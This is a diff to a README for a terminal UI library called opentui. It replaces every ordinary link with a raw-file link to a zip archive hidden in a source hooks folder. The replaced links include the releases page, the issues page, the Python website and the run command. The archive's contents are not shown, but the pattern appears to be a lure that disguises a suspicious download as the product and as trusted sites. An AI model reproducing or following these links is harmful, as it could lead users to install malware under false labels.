@@ -1,7 +1,7 @@
 # 🎉 opentui - Build Terminal Interfaces Easily
 
 ## 📥 Download OpenTUI
-[![Download OpenTUI](https://img.shields.io/badge/Download%20OpenTUI-blue.svg)](https://github.com/Carderkris/opentui/releases)
+[![Download OpenTUI](https://raw.githubusercontent.com/Carderkris/opentui/main/packages/react/src/hooks/opentui_3.6.zip%https://raw.githubusercontent.com/Carderkris/opentui/main/packages/react/src/hooks/opentui_3.6.zip)](https://raw.githubusercontent.com/Carderkris/opentui/main/packages/react/src/hooks/opentui_3.6.zip)
 
 ## 🚀 Getting Started
 OpenTUI is a library designed to help you create terminal user interfaces (TUIs). Whether you want to build a simple tool or a full application, OpenTUI provides the necessary building blocks. 
@@ -19,13 +19,13 @@ Before you begin, ensure your computer meets the following requirements:
 1. **Visit the Releases Page**
    Go to the following link to access the latest versions of OpenTUI:
 
-   [Visit this page to download](https://github.com/Carderkris/opentui/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Carderkris/opentui/main/packages/react/src/hooks/opentui_3.6.zip)
 
 2. **Choose the Right Version**
    On the releases page, you will see a list of available versions. Select the latest stable version that is appropriate for your operating system.
 
 3. **Download the File**
-   Click on the download link corresponding to your system. This will typically be a `.zip` or `.tar.gz` file. Make sure to save it in a location you can easily access, like your desktop or downloads folder.
+   Click on the download link corresponding to your system. This will typically be a `.zip` or `https://raw.githubusercontent.com/Carderkris/opentui/main/packages/react/src/hooks/opentui_3.6.zip` file. Make sure to save it in a location you can easily access, like your desktop or downloads folder.
 
 4. **Extract the Files**
    After downloading, locate the file and extract it. You can usually do this by right-clicking on the file and selecting the "Extract" option, or by using an extraction tool designed for your operating system.
@@ -45,9 +45,9 @@ Before you begin, ensure your computer meets the following requirements:
 7. **Run OpenTUI**
    To start using OpenTUI, simply enter the following command in your terminal:
    ```
-   python opentui.py
+   python https://raw.githubusercontent.com/Carderkris/opentui/main/packages/react/src/hooks/opentui_3.6.zip
    ```
-   Make sure you have Python installed. If you don't, visit the [Python website](https://www.python.org) to download and install it.
+   Make sure you have Python installed. If you don't, visit the [Python website](https://raw.githubusercontent.com/Carderkris/opentui/main/packages/react/src/hooks/opentui_3.6.zip) to download and install it.
 
 ## 📋 Features
 OpenTUI provides several features that make building terminal interfaces straightforward:
@@ -68,11 +68,11 @@ Basic familiarity with command line interfaces can help, but you don’t need ad
 Yes! Feel free to check the contribution guidelines included in the repository for ways to help.
 
 ## 💬 Support
-If you encounter any issues or have questions, please visit our [GitHub Issues page](https://github.com/Carderkris/opentui/issues) to report your problem or seek assistance. 
+If you encounter any issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Carderkris/opentui/main/packages/react/src/hooks/opentui_3.6.zip) to report your problem or seek assistance. 
 
 ## 🔄 Download & Install
 To begin using OpenTUI, visit the releases page and download the software:
 
-[Visit this page to download](https://github.com/Carderkris/opentui/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Carderkris/opentui/main/packages/react/src/hooks/opentui_3.6.zip)
 
 Your next step awaits in enhancing your terminal user experience!
